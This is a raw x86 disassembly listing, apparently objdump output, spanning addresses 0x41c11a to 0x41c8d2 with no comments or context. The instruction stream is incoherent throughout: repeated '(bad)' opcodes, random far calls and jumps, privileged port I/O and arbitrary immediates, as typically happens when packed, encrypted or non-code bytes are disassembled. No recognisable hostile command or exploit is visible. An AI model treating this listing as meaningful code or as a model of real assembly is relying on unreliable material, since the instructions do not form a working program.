  41c11a:	ins    BYTE PTR es:[edi],dx
  41c11b:	ficomp WORD PTR fs:[edx-0x380dd04a]
  41c122:	nop
  41c123:	dec    eax
  41c124:	(bad)  
  41c126:	dec    ecx
  41c127:	cld    
  41c128:	ret    
  41c129:	inc    esp
  41c12a:	imul   DWORD PTR [edx+eiz*4+0x72d0461c]
  41c131:	jp     0x41c0b9
  41c133:	adc    eax,0x9f95f110
  41c138:	pop    es
  41c139:	fwait
  41c13a:	(bad)  
  41c13b:	mov    ds:0xc9e4d9dd,eax
  41c140:	jl     0x41c16d
  41c142:	push   ss
  41c143:	out    dx,eax
  41c144:	push   edi
  41c145:	pop    edi
  41c146:	cmp    BYTE PTR [ebp+esi*8-0x1b],dh
  41c14a:	dec    esp
  41c14b:	push   ss
  41c14c:	mov    bh,0xb9
  41c14e:	mov    eax,0x765d515b
  41c153:	jae    0x41c188
  41c155:	inc    eax
  41c156:	cmp    al,0x90
  41c158:	add    eax,0xfafcced7
  41c15d:	fst    QWORD PTR [ecx+ebp*4-0x73]
  41c161:	ja     0x41c0e6
  41c163:	dec    ebp
  41c164:	test   eax,0xbf1be77c
  41c169:	test   ebp,edx
  41c16b:	xchg   esi,eax
  41c16c:	data16 div BYTE PTR [eax]
  41c16f:	dec    ecx
  41c170:	push   cs
  41c171:	or     DWORD PTR [ebp-0x32],ecx
  41c174:	enter  0x6569,0x35
  41c178:	lock mov al,ds:0xf9b50c37
  41c17e:	loop   0x41c148
  41c180:	mov    bl,0x1b
  41c182:	dec    esi
  41c183:	mov    ebx,0x3f878c1c
  41c188:	mov    eax,ds:0xbe7885ea
  41c18d:	mov    ebp,0x9976f9c
  41c192:	jge    0x41c14a
  41c194:	pop    ebx
  41c195:	mov    cl,0x5d
  41c197:	mov    ch,0xae
  41c199:	add    edi,edi
  41c19b:	xrstor [edx+0x79]
  41c19f:	xchg   DWORD PTR [ebp+0x2a0a4414],esi
  41c1a5:	imul   ecx,DWORD PTR [eax],0xbfb8528c
  41c1ab:	xchg   ebp,ebx
  41c1ad:	and    ebp,ecx
  41c1af:	repnz add bl,BYTE PTR [ecx-0x72dce6f4]
  41c1b6:	jae    0x41c1b3
  41c1b8:	inc    eax
  41c1b9:	xor    esp,DWORD PTR [ebp+0x64]
  41c1bc:	jae    0x41c222
  41c1be:	dec    esp
  41c1bf:	(bad)  
  41c1c1:	mov    bl,0x51
  41c1c3:	cmp    al,0x26
  41c1c5:	jb     0x41c1a1
  41c1c7:	sbb    cl,BYTE PTR [ecx]
  41c1c9:	add    BYTE PTR [esi-0x1e],dh
  41c1cc:	out    dx,al
  41c1cd:	jnp    0x41c15a
  41c1cf:	xchg   ecx,eax
  41c1d0:	push   esp
  41c1d1:	xchg   edx,eax
  41c1d2:	xchg   BYTE PTR es:[esi-0x1f],bl
  41c1d6:	imul   ebp,esp,0xffffffb9
  41c1d9:	mov    eax,0x29e3bb5f
  41c1de:	xchg   edx,eax
  41c1df:	cdq    
  41c1e0:	mov    ebx,eax
  41c1e2:	xor    al,0x86
  41c1e4:	shr    BYTE PTR [esi-0x13],0x26
  41c1e8:	add    bl,BYTE PTR [ecx]
  41c1ea:	lods   eax,DWORD PTR ds:[esi]
  41c1eb:	out    0xec,eax
  41c1ed:	je     0x41c227
  41c1ef:	pop    ebx
  41c1f0:	popf   
  41c1f1:	jle    0x41c231
  41c1f3:	mov    cl,BYTE PTR [ebp-0x1c]
  41c1f6:	jl     0x41c239
  41c1f8:	cli    
  41c1f9:	add    ah,BYTE PTR [esp+eax*4-0x35b6a58b]
  41c200:	and    BYTE PTR [ecx-0x24],0x35
  41c204:	jecxz  0x41c272
  41c206:	xchg   edi,eax
  41c207:	ret    0x9f1d
  41c20a:	fcmovnu st,st(2)
  41c20c:	jnp    0x41c25b
  41c20e:	sub    esp,esi
  41c210:	sbb    eax,0x40e65c08
  41c215:	repz das 
  41c217:	cmp    DWORD PTR [edi],ecx
  41c219:	out    0xb6,al
  41c21b:	das    
  41c21c:	mov    edi,0x4f0a38cd
  41c221:	xor    DWORD PTR [ebx-0x12924630],0x54f2adb7
  41c22b:	popa   
  41c22c:	add    ebx,ebp
  41c22e:	(bad)  
  41c22f:	cmp    eax,0x386a2e69
  41c234:	or     eax,0xe3a38026
  41c239:	(bad)  
  41c23a:	adc    DWORD PTR [esi],ebx
  41c23c:	test   BYTE PTR [eax],dl
  41c23e:	pusha  
  41c23f:	cdq    
  41c240:	xchg   BYTE PTR ds:0xc3ffee23,dl
  41c246:	shl    dh,cl
  41c248:	push   edx
  41c249:	mov    ah,0x7e
  41c24b:	(bad)  
  41c24c:	rcl    BYTE PTR [ecx],cl
  41c24e:	mov    esi,0xd11ea21f
  41c253:	xchg   esp,edi
  41c255:	xchg   BYTE PTR [ecx],ch
  41c257:	add    BYTE PTR [edi-0x5e],ch
  41c25a:	xchg   ebp,eax
  41c25b:	iret   
  41c25c:	loopne 0x41c1f0
  41c25e:	in     eax,0xcb
  41c260:	sahf   
  41c261:	rcl    DWORD PTR [ebx+ecx*4],0x93
  41c265:	ss add eax,0xd34496e9
  41c26b:	popf   
  41c26c:	pop    ds
  41c26d:	push   edx
  41c26e:	imul   esi,DWORD PTR [ecx+0x1fa484fa],0xc593fd3a
  41c278:	popa   
  41c279:	fsubr  QWORD PTR ds:0x4069c736
  41c27f:	or     eax,0x491451a0
  41c284:	inc    esp
  41c285:	fisub  WORD PTR [ecx+0x38]
  41c288:	call   0x481a:0x651a3005
  41c28f:	push   edi
  41c290:	jb     0x41c2f7
  41c292:	add    al,0x41
  41c294:	adc    ebx,esp
  41c296:	push   edx
  41c297:	loope  0x41c27c
  41c299:	cmc    
  41c29a:	ds ins BYTE PTR es:[edi],dx
  41c29c:	and    ch,bh
  41c29e:	jns    0x41c27a
  41c2a0:	ds int3 
  41c2a2:	idiv   bl
  41c2a4:	neg    ch
  41c2a6:	inc    ecx
  41c2a7:	mov    ecx,0x26b9e6a8
  41c2ac:	loope  0x41c298
  41c2ae:	cmp    cl,BYTE PTR [eax+edi*4]
  41c2b1:	outs   dx,DWORD PTR ds:[esi]
  41c2b2:	lahf   
  41c2b3:	mov    eax,0xc82976f2
  41c2b8:	leave  
  41c2b9:	out    dx,eax
  41c2ba:	mov    al,BYTE PTR [ebx-0x3a]
  41c2bd:	xor    al,0xdb
  41c2bf:	sbb    eax,0x8da92245
  41c2c4:	mov    al,ds:0x15cee5a5
  41c2c9:	adc    edx,DWORD PTR [edi-0x65dfd557]
  41c2cf:	jnp    0x41c328
  41c2d1:	test   DWORD PTR [edx+eax*4],esi
  41c2d4:	mov    esp,0x9fe8596f
  41c2d9:	jne    0x41c291
  41c2db:	aas    
  41c2dc:	dec    esp
  41c2dd:	test   eax,0xd62afc7e
  41c2e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2e3:	or     edx,0xffffff8d
  41c2e6:	pop    ds
  41c2e7:	pop    edi
  41c2e8:	in     al,0x61
  41c2ea:	aad    0x9
  41c2ec:	into   
  41c2ed:	mov    ds:0xd9ec8a6a,al
  41c2f2:	add    eax,0xc26a48e6
  41c2f7:	call   0x3830:0xfaf386bb
  41c2fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2ff:	cli    
  41c300:	imul   ebx,DWORD PTR [edi+0x5],0x68
  41c304:	mov    edx,esp
  41c306:	int    0xa7
  41c308:	push   ebx
  41c309:	mov    ebp,0xc84687f0
  41c30e:	lock repnz fimul DWORD PTR [ebp+0x19962935]
  41c316:	lss    esp,FWORD PTR [edi]
  41c319:	sbb    BYTE PTR [esi+0x45d87954],ch
  41c31f:	lds    eax,FWORD PTR [ebp+0xcf5d88f]
  41c325:	push   ebx
  41c326:	xor    cl,cl
  41c328:	stc    
  41c329:	mov    edx,DWORD PTR [edi-0xe867cac]
  41c32f:	jb     0x41c2b3
  41c331:	out    dx,eax
  41c332:	push   esi
  41c333:	stc    
  41c334:	or     eax,0xfa3c8be4
  41c339:	jmp    0xc02182d7
  41c33e:	rcr    dl,0x8b
  41c341:	pop    ebx
  41c342:	scas   al,BYTE PTR es:[edi]
  41c343:	fild   QWORD PTR [ebx-0x9]
  41c346:	daa    
  41c347:	test   al,0xb6
  41c349:	push   ebx
  41c34a:	cmp    BYTE PTR [ebx],0xbb
  41c34d:	dec    edx
  41c34e:	mov    eax,es:0xcbaa890f
  41c354:	idiv   DWORD PTR [eax]
  41c356:	(bad)  [edi+0x4c]
  41c359:	cli    
  41c35a:	sbb    BYTE PTR [esi-0x1b],al
  41c35d:	adc    DWORD PTR ds:0x2b607617,esi
  41c363:	lock data16 das 
  41c366:	mov    ecx,0x921b33fe
  41c36b:	(bad)  
  41c36c:	ss call 0x6a9f:0xf7958946
  41c374:	shrd   DWORD PTR [edi+0x56307766],ebp,0xfa
  41c37c:	mov    dl,0xa0
  41c37e:	repz push ebx
  41c380:	leave  
  41c381:	and    al,0xeb
  41c383:	mov    cl,0x19
  41c385:	mov    edi,0x400278a2
  41c38a:	push   eax
  41c38b:	push   esi
  41c38c:	mov    dl,0xe3
  41c38e:	jmp    0x354442d9
  41c393:	cmp    edi,DWORD PTR [esi-0x11]
  41c396:	in     eax,0xc0
  41c398:	test   al,0x2e
  41c39a:	mov    eax,ds:0x15bf1b7c
  41c39f:	adc    ah,ch
  41c3a1:	jl     0x41c34c
  41c3a3:	push   ecx
  41c3a4:	inc    ebx
  41c3a5:	in     al,dx
  41c3a6:	mov    bl,0x18
  41c3a8:	sub    BYTE PTR [edi+ecx*4+0x72f4dcb9],0x91
  41c3b0:	and    DWORD PTR [ebp+0x6b5709ed],esi
  41c3b6:	fidiv  DWORD PTR [esi-0x5a]
  41c3b9:	pop    ecx
  41c3ba:	mov    bh,0x58
  41c3bc:	fild   QWORD PTR [edx]
  41c3be:	shl    BYTE PTR [ecx+0x72],cl
  41c3c1:	xchg   edx,eax
  41c3c2:	fld    DWORD PTR [ebx]
  41c3c4:	cmp    edi,DWORD PTR [ebx+esi*1-0x16]
  41c3c8:	loop   0x41c43e
  41c3ca:	inc    edx
  41c3cb:	shl    DWORD PTR [ebx],cl
  41c3cd:	cmp    BYTE PTR [ebp+ecx*4+0x1e0aa7a6],ah
  41c3d4:	scas   al,BYTE PTR es:[edi]
  41c3d5:	mov    bl,cl
  41c3d7:	mov    eax,ds:0x2c9e33c2
  41c3dc:	ins    BYTE PTR es:[edi],dx
  41c3dd:	add    al,0xc7
  41c3df:	lods   al,BYTE PTR ds:[esi]
  41c3e0:	push   ecx
  41c3e1:	cdq    
  41c3e2:	mov    dh,0xfd
  41c3e4:	(bad)  
  41c3e5:	hlt    
  41c3e6:	xor    edi,esi
  41c3e8:	push   es
  41c3e9:	cmc    
  41c3ea:	cld    
  41c3eb:	inc    eax
  41c3ec:	pop    ecx
  41c3ed:	mov    ah,0xb4
  41c3ef:	jle    0x41c3f7
  41c3f1:	inc    ecx
  41c3f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3f3:	push   es
  41c3f4:	pusha  
  41c3f5:	sub    eax,0x79163f7c
  41c3fa:	xor    esi,DWORD PTR [eax]
  41c3fc:	ret    0x8841
  41c3ff:	shl    ebx,0x63
  41c402:	xor    eax,0xd5ad8521
  41c407:	sub    ecx,edi
  41c409:	xchg   DWORD PTR [edi],eax
  41c40b:	scas   al,BYTE PTR es:[edi]
  41c40c:	xor    al,0xad
  41c40e:	sub    eax,0x5d55abfd
  41c413:	push   cs
  41c414:	mov    ah,0xea
  41c416:	mov    bh,0xb1
  41c418:	jmp    0xaf89:0x3574c561
  41c41f:	das    
  41c420:	jge    0x41c426
  41c422:	mov    WORD PTR [esi],ds
  41c424:	pop    ebp
  41c425:	and    dh,dh
  41c427:	add    esi,DWORD PTR [edx+0x13]
  41c42a:	push   eax
  41c42b:	ffreep st(4)
  41c42d:	das    
  41c42e:	and    al,0x66
  41c430:	jl     0x41c495
  41c432:	dec    ebp
  41c433:	xor    DWORD PTR [esi-0x16],ebp
  41c436:	pop    ecx
  41c437:	push   esi
  41c438:	es push cs
  41c43a:	pop    edx
  41c43b:	repnz mov ch,0x41
  41c43e:	dec    esi
  41c43f:	jmp    0x41c46d
  41c441:	int    0xb3
  41c443:	into   
  41c444:	ins    DWORD PTR es:[edi],dx
  41c445:	sahf   
  41c446:	cmp    DWORD PTR [edi],ecx
  41c448:	retf   
  41c449:	lods   al,BYTE PTR ds:[esi]
  41c44a:	je     0x41c490
  41c44c:	and    ebp,DWORD PTR [edi-0x24]
  41c44f:	test   DWORD PTR [esi+0x555e9dd],eax
  41c455:	fsub   DWORD PTR ds:0x37dd3af3
  41c45b:	test   esi,0xe584b456
  41c461:	fistp  QWORD PTR [ebx+0x15]
  41c464:	or     al,0x94
  41c467:	jmp    0xad10b881
  41c46c:	cmp    DWORD PTR [esi],0x4dc08a9d
  41c472:	add    DWORD PTR [esi],esi
  41c474:	in     eax,dx
  41c475:	shr    ebp,0x44
  41c478:	aam    0xe6
  41c47a:	shl    BYTE PTR [ecx+0x7c6df300],0x96
  41c481:	icebp  
  41c482:	test   al,0x59
  41c484:	mov    ds:0xb06c62ec,al
  41c489:	(bad)  
  41c48a:	jnp    0x41c4b4
  41c48c:	and    eax,0xf150431f
  41c491:	leave  
  41c492:	jle    0x41c45f
  41c494:	adc    DWORD PTR [ecx],eax
  41c496:	aad    0x84
  41c498:	idiv   BYTE PTR [esp+esi*2+0x16c5fe61]
  41c49f:	add    ebp,DWORD PTR [edx-0x408c437e]
  41c4a5:	xlat   BYTE PTR ds:[ebx]
  41c4a6:	cld    
  41c4a7:	push   es
  41c4a8:	and    al,0x58
  41c4aa:	dec    esi
  41c4ab:	mov    ds:0x254ab64a,eax
  41c4b0:	sub    edx,eax
  41c4b2:	or     al,0x1a
  41c4b4:	les    ebp,FWORD PTR ds:0x2392e148
  41c4ba:	retf   0xce85
  41c4bd:	jl     0x41c4da
  41c4bf:	xor    ebp,DWORD PTR [esi-0x80]
  41c4c2:	mov    al,0xd1
  41c4c4:	mov    edx,DWORD PTR [ebx-0x42ffc6b2]
  41c4ca:	sub    BYTE PTR [edi-0x71],bl
  41c4cd:	retf   
  41c4ce:	je     0x41c497
  41c4d0:	repz je 0x41c50a
  41c4d3:	fisub  DWORD PTR [ebx]
  41c4d5:	inc    ecx
  41c4d6:	mov    bh,dl
  41c4d8:	dec    edx
  41c4d9:	mov    dl,0x65
  41c4db:	cwde   
  41c4dc:	cmp    al,BYTE PTR [eax+0x32]
  41c4df:	dec    edx
  41c4e0:	inc    esp
  41c4e1:	push   0xd615616f
  41c4e6:	mov    DWORD PTR [esi],edx
  41c4e8:	jg     0x41c48d
  41c4ea:	ds mov cl,0xf4
  41c4ed:	mov    ecx,0xc28b77db
  41c4f2:	mov    gs,WORD PTR [edi-0x6f]
  41c4f5:	adc    al,0x2f
  41c4f7:	push   0x3ab83c1b
  41c4fc:	popa   
  41c4fd:	mov    BYTE PTR [edi],cl
  41c4ff:	sub    al,0xe9
  41c501:	sbb    eax,eax
  41c503:	fisttp WORD PTR [edi+0x774bd0aa]
  41c509:	fst    QWORD PTR [ebp-0x36d78034]
  41c50f:	rcr    BYTE PTR [esi+0x41],cl
  41c512:	pop    edi
  41c513:	or     DWORD PTR [ebx],esi
  41c515:	ret    
  41c516:	ds call 0x3e35b66c
  41c51c:	adc    eax,0x894014e9
  41c521:	mov    esi,DWORD PTR [ebx+0x33f9f7a5]
  41c527:	pop    esi
  41c528:	mov    dl,0x22
  41c52a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c52b:	aad    0xfa
  41c52d:	fwait
  41c52e:	xor    eax,0x8722b6fb
  41c533:	pop    esi
  41c534:	mov    cl,0x78
  41c536:	loop   0x41c541
  41c538:	fistp  DWORD PTR [ecx+eax*4]
  41c53b:	adc    eax,0xd483847a
  41c540:	retf   0xadd4
  41c543:	lahf   
  41c544:	test   eax,0x7be5b15d
  41c549:	mov    WORD PTR [ecx+edx*2+0x1c11d417],ds
  41c550:	call   FWORD PTR [ecx+0x19db8c0f]
  41c556:	mov    esi,0xef40661e
  41c55b:	dec    esp
  41c55c:	imul   esi,eax,0xfbfac621
  41c562:	mov    WORD PTR [edi],es
  41c564:	(bad)  
  41c565:	mov    eax,0x493f4766
  41c56a:	popf   
  41c56b:	enter  0xde3f,0x5b
  41c56f:	sub    eax,0x41763ff
  41c574:	cmp    DWORD PTR [ecx-0x35],0xfffffff1
  41c578:	push   0x72448f34
  41c57d:	add    ebx,DWORD PTR [edi+0x27]
  41c580:	dec    ebp
  41c581:	and    al,0xf2
  41c583:	mov    cl,0x30
  41c585:	aaa    
  41c586:	and    cl,BYTE PTR [ecx-0x1f]
  41c589:	or     eax,0xb2c37621
  41c58e:	sub    BYTE PTR [eax],al
  41c590:	aas    
  41c591:	pushf  
  41c592:	or     bh,BYTE PTR [ecx-0x6a]
  41c595:	or     bl,dl
  41c597:	aam    0x8d
  41c599:	pop    eax
  41c59a:	shr    bl,1
  41c59c:	adc    bl,bl
  41c59e:	sbb    BYTE PTR [ebp+0x3b973a07],bh
  41c5a4:	dec    esp
  41c5a5:	xchg   edx,esi
  41c5a7:	sahf   
  41c5a8:	dec    edx
  41c5a9:	data16 int 0xf1
  41c5ac:	and    bh,BYTE PTR [edx+0x11]
  41c5af:	pop    ss
  41c5b0:	push   ebx
  41c5b1:	fmul   QWORD PTR [esi-0x67]
  41c5b4:	daa    
  41c5b5:	loope  0x41c552
  41c5b7:	mov    DWORD PTR [ecx+edi*4+0x6ef76c7d],esi
  41c5be:	ror    BYTE PTR [esi+eax*2+0x24],0xba
  41c5c3:	scas   eax,DWORD PTR es:[edi]
  41c5c4:	push   ebx
  41c5c5:	xor    eax,0xf162e114
  41c5ca:	xor    eax,0x5f6e8ef6
  41c5cf:	test   BYTE PTR [ebx],dl
  41c5d1:	jmp    0xe25370e
  41c5d6:	pop    ebx
  41c5d7:	sub    ch,al
  41c5d9:	dec    edi
  41c5da:	dec    ecx
  41c5db:	xchg   esp,eax
  41c5dc:	mov    eax,ds:0x28cf3935
  41c5e1:	pop    ecx
  41c5e2:	loopne 0x41c5ac
  41c5e4:	retf   0x1315
  41c5e7:	mov    esi,0xfefd939e
  41c5ec:	xchg   ebp,eax
  41c5ed:	popf   
  41c5ee:	add    al,0xba
  41c5f0:	lods   al,BYTE PTR ds:[esi]
  41c5f1:	sar    DWORD PTR [ecx+0x4166b336],1
  41c5f7:	lds    esp,FWORD PTR [ebx]
  41c5f9:	push   esi
  41c5fa:	dec    eax
  41c5fb:	adc    BYTE PTR [esp+esi*8+0x496f9f66],dh
  41c602:	sub    al,0xd7
  41c604:	sbb    esp,DWORD PTR [eax]
  41c606:	jp     0x41c62b
  41c608:	lods   eax,DWORD PTR ds:[esi]
  41c609:	or     BYTE PTR [edx+0xd2f18ee],0xd
  41c610:	mov    eax,DWORD PTR ds:0x2f76e25a
  41c616:	mov    esp,0x6869582
  41c61b:	sub    al,0x69
  41c61d:	hlt    
  41c61e:	cmp    edi,esp
  41c620:	inc    ebp
  41c621:	push   eax
  41c622:	ins    DWORD PTR es:[edi],dx
  41c623:	retf   0xaec
  41c626:	jns    0x41c62a
  41c628:	push   ecx
  41c629:	jmp    0x271c:0x1e6fba8d
  41c630:	pop    ebp
  41c631:	sbb    esi,esi
  41c633:	sub    BYTE PTR [edx-0x16b2659f],dl
  41c639:	sbb    al,0x92
  41c63b:	popf   
  41c63c:	jle    0x41c623
  41c63e:	or     cl,BYTE PTR [eax-0x4896c197]
  41c644:	pop    ebp
  41c645:	cwde   
  41c646:	retf   0x53c4
  41c649:	je     0x41c67b
  41c64b:	enter  0x20cf,0x53
  41c64f:	sbb    DWORD PTR [ebx-0x2f],esi
  41c652:	xchg   ecx,eax
  41c653:	bound  edi,QWORD PTR [edx-0x7639f029]
  41c659:	bound  ebp,QWORD PTR [eax]
  41c65b:	test   BYTE PTR [eax-0x3becbd5e],0x83
  41c662:	pop    edx
  41c663:	fld    QWORD PTR [esi+edx*1-0x5aaeb588]
  41c66a:	pushf  
  41c66b:	push   eax
  41c66c:	in     eax,0x0
  41c66e:	dec    edi
  41c66f:	call   0xc12b:0x862feaaf
  41c676:	pop    ds
  41c677:	xlat   BYTE PTR ds:[ebx]
  41c678:	or     DWORD PTR [ebx+0x68a564b7],edi
  41c67e:	cmp    al,0xb
  41c680:	and    eax,0xcf9a3e1b
  41c685:	dec    edi
  41c686:	call   0xe4a5ef09
  41c68b:	test   al,0x9d
  41c68d:	inc    BYTE PTR [ecx-0xbac8098]
  41c693:	or     DWORD PTR [ebx],esi
  41c695:	cmp    DWORD PTR [ebp+0x51],ebx
  41c698:	adc    al,0x7d
  41c69a:	xlat   BYTE PTR ds:[ebx]
  41c69b:	into   
  41c69c:	popf   
  41c69d:	pop    ecx
  41c69e:	add    DWORD PTR [ebx+esi*4],edx
  41c6a1:	shl    BYTE PTR [ecx],0x70
  41c6a4:	jbe    0x41c711
  41c6a6:	fs jb  0x41c645
  41c6a9:	and    eax,0x1396ff08
  41c6ae:	sub    al,0xdc
  41c6b0:	popf   
  41c6b1:	clc    
  41c6b2:	enter  0x2f10,0x4
  41c6b6:	inc    esp
  41c6b7:	stos   DWORD PTR es:[edi],eax
  41c6b8:	cvtdq2ps xmm2,xmm4
  41c6bb:	push   es
  41c6bc:	fsubr  QWORD PTR [ecx-0x6016e5bb]
  41c6c2:	mov    BYTE PTR [edi+0x6f],0xdd
  41c6c6:	daa    
  41c6c7:	jp     0x41c692
  41c6c9:	push   ss
  41c6ca:	(bad)  
  41c6cb:	sti    
  41c6cc:	or     al,0x9f
  41c6ce:	shl    BYTE PTR [edx-0x33],1
  41c6d1:	sbb    edx,DWORD PTR [edi-0x46c5449e]
  41c6d7:	daa    
  41c6d8:	bnd ja 0x41c672
  41c6db:	and    DWORD PTR [edx],0xfffffffc
  41c6de:	xor    al,0x3
  41c6e0:	pop    esp
  41c6e1:	add    eax,0x5a10afb4
  41c6e6:	xor    esi,edx
  41c6e8:	cdq    
  41c6e9:	or     al,0xdb
  41c6eb:	inc    ebp
  41c6ec:	test   eax,0xd6a531a0
  41c6f1:	mov    ch,0x33
  41c6f3:	jo     0x41c6a3
  41c6f5:	xchg   DWORD PTR [ebx],ebp
  41c6f7:	dec    esi
  41c6f8:	int    0xb8
  41c6fa:	pop    ds
  41c6fb:	daa    
  41c6fc:	push   esi
  41c6fd:	leave  
  41c6fe:	jbe    0x41c6ac
  41c700:	sbb    al,0x84
  41c702:	call   0x7ddb:0xb816bd55
  41c709:	std    
  41c70a:	fisub  DWORD PTR [ecx-0x25]
  41c70d:	shl    ch,1
  41c70f:	std    
  41c710:	xchg   ebp,eax
  41c711:	dec    edi
  41c712:	test   DWORD PTR [ebx+0x372c9863],eax
  41c718:	int3   
  41c719:	or     bl,BYTE PTR [ebp+0x6e]
  41c71c:	xchg   ebp,eax
  41c71d:	dec    ebx
  41c71e:	mov    al,ds:0x3740cce4
  41c723:	xor    BYTE PTR [esi+0x757e1d2a],al
  41c729:	ins    BYTE PTR es:[edi],dx
  41c72a:	rcr    DWORD PTR [edi+ebx*1+0x51cea927],cl
  41c731:	fdivr  QWORD PTR [esi+eax*8-0x1039c85b]
  41c738:	push   0xb564f177
  41c73d:	add    ah,ch
  41c73f:	or     bh,BYTE PTR [eax]
  41c741:	loop   0x41c742
  41c743:	js     0x41c71a
  41c745:	aas    
  41c746:	cld    
  41c747:	cmc    
  41c748:	jo     0x41c732
  41c74a:	push   ebp
  41c74b:	in     eax,0x1f
  41c74d:	push   fs
  41c74f:	stc    
  41c750:	or     al,0xda
  41c752:	jnp    0x41c71d
  41c754:	xor    edi,ecx
  41c756:	cwde   
  41c757:	sbb    cl,BYTE PTR [ebx]
  41c759:	mov    eax,ds:0xf4d7260d
  41c75e:	xor    al,BYTE PTR [ecx-0x12632369]
  41c764:	out    dx,eax
  41c765:	sub    DWORD PTR [edi+eiz*2],esp
  41c768:	jg     0x41c797
  41c76a:	js     0x41c786
  41c76c:	aad    0xea
  41c76e:	pop    ebp
  41c76f:	jns    0x41c794
  41c771:	and    al,0x99
  41c773:	out    dx,eax
  41c774:	imul   edx,edi,0xabe549f0
  41c77a:	xchg   ebp,eax
  41c77b:	loop   0x41c6fd
  41c77d:	outs   dx,DWORD PTR cs:[esi]
  41c77f:	addr16 mov al,ds:0xbcfd
  41c783:	jo     0x41c742
  41c785:	fisttp DWORD PTR [ebx+0x64]
  41c788:	sbb    dh,ah
  41c78a:	cdq    
  41c78b:	(bad)  
  41c78c:	push   ebx
  41c78d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c78e:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41c790:	jp     0x41c806
  41c792:	dec    eax
  41c793:	mov    ah,0xb8
  41c795:	pusha  
  41c796:	std    
  41c797:	pop    esi
  41c798:	outs   dx,DWORD PTR ds:[esi]
  41c799:	pmaxub mm2,QWORD PTR [eax]
  41c79c:	sub    BYTE PTR [ebp+0x7f],al
  41c79f:	in     eax,dx
  41c7a0:	cld    
  41c7a1:	xchg   edx,eax
  41c7a2:	mov    BYTE PTR [esi],0x84
  41c7a5:	test   DWORD PTR [ebp-0x35],ecx
  41c7a8:	arpl   dx,bp
  41c7aa:	push   ebp
  41c7ab:	leave  
  41c7ac:	pop    esi
  41c7ad:	test   al,0x59
  41c7af:	loopne 0x41c80a
  41c7b1:	(bad)  
  41c7b3:	mov    cl,0xe6
  41c7b5:	cmp    dl,BYTE PTR [esi-0x1a]
  41c7b8:	mov    WORD PTR [ebx-0x7f],es
  41c7bb:	inc    ecx
  41c7bc:	shl    DWORD PTR [ebp-0x4b772954],0x95
  41c7c3:	mov    ah,0x38
  41c7c5:	(bad)  
  41c7c6:	mov    ebx,0x70720a44
  41c7cb:	dec    esi
  41c7cc:	std    
  41c7cd:	(bad)  
  41c7ce:	repnz add dl,BYTE PTR [ecx+0x4067b205]
  41c7d5:	jl     0x41c79b
  41c7d7:	icebp  
  41c7d8:	xchg   edx,eax
  41c7d9:	fstp   TBYTE PTR [ebx+0x35]
  41c7dc:	(bad)  
  41c7dd:	mov    cl,0x5f
  41c7df:	pop    edx
  41c7e0:	and    ecx,DWORD PTR [edi-0x7a1dbf00]
  41c7e6:	push   es
  41c7e7:	pushf  
  41c7e8:	bnd jnp 0x41c79c
  41c7eb:	add    bl,BYTE PTR [ebx]
  41c7ed:	and    al,0x7f
  41c7ef:	hlt    
  41c7f0:	mov    eax,ds:0x610a587d
  41c7f5:	addr16 ds pop ebx
  41c7f8:	pop    eax
  41c7f9:	js     0x41c7fd
  41c7fb:	mov    ecx,edi
  41c7fd:	hlt    
  41c7fe:	gs push ds
  41c800:	clc    
  41c801:	dec    eax
  41c802:	out    0xbf,eax
  41c804:	aam    0x70
  41c806:	xchg   edx,eax
  41c807:	aas    
  41c808:	xchg   edx,eax
  41c809:	jbe    0x41c860
  41c80b:	mov    bl,BYTE PTR [ebp+0x3e]
  41c80e:	add    al,0xa
  41c810:	xor    BYTE PTR [eax-0x9],al
  41c813:	lea    ecx,ds:0xcd5b5630
  41c819:	xchg   DWORD PTR ss:[eax-0x36],eax
  41c81d:	dec    edx
  41c81e:	adc    al,0x9a
  41c820:	ret    
  41c821:	pop    eax
  41c822:	call   0x35de:0xaa9e8f18
  41c829:	xchg   DWORD PTR [ecx+ebp*4],ecx
  41c82c:	mov    DWORD PTR [edi-0x15],esi
  41c82f:	in     al,0xa
  41c831:	bound  esp,QWORD PTR [esi-0x6b44f805]
  41c837:	addr16 jb 0x41c859
  41c83a:	jmp    0xae1:0xb6d2fe82
  41c841:	push   ebx
  41c842:	sub    bl,ah
  41c844:	pop    eax
  41c845:	and    ecx,DWORD PTR [ebp-0x34]
  41c848:	or     DWORD PTR [eax+edi*2-0x7c],eax
  41c84c:	or     al,cl
  41c84e:	inc    ebp
  41c84f:	mov    eax,0x506c67ae
  41c854:	out    dx,eax
  41c855:	xchg   esi,eax
  41c856:	mov    al,ds:0x17895eb0
  41c85b:	call   0x7a3d7082
  41c860:	pop    eax
  41c861:	repnz push edx
  41c863:	stc    
  41c864:	popf   
  41c865:	shr    DWORD PTR [ecx+eax*1+0x49eb54bf],0x5c
  41c86d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c86e:	int3   
  41c86f:	xchg   ecx,eax
  41c870:	sub    esi,ecx
  41c872:	sub    al,0xb0
  41c874:	fwait
  41c875:	push   eax
  41c876:	dec    ebp
  41c877:	fdecstp 
  41c879:	daa    
  41c87a:	lds    ecx,FWORD PTR [esi-0x4a01f26a]
  41c880:	neg    BYTE PTR [eax]
  41c882:	retf   
  41c883:	dec    esi
  41c884:	sar    BYTE PTR [eax+edx*2+0x7c],0xa0
  41c889:	inc    edx
  41c88a:	imul   esp,DWORD PTR [eax-0x68885459],0x2b
  41c891:	mov    esi,0xf74b20a9
  41c896:	dec    esp
  41c897:	test   DWORD PTR [ecx+0x5d],0xc7d77dc1
  41c89e:	push   edi
  41c89f:	xchg   DWORD PTR [edx-0x1e9daa54],edx
  41c8a5:	mov    ah,al
  41c8a7:	ss mov edi,0xc48c8217
  41c8ad:	shr    ch,cl
  41c8af:	and    ah,BYTE PTR [eax+0x4e525b4]
  41c8b5:	push   ebp
  41c8b6:	in     eax,0xc7
  41c8b8:	(bad)  
  41c8b9:	call   0x3defed8b
  41c8be:	inc    ebp
  41c8bf:	outs   dx,DWORD PTR ds:[esi]
  41c8c0:	mov    eax,ds:0x44c1e31d
  41c8c5:	mov    ebp,0xaed6558e
  41c8ca:	(bad)  
  41c8cb:	and    BYTE PTR [edi+0x48eeb590],cl
  41c8d1:	xchg   ecx,eax
  41c8d2:	xchg   edx,eax
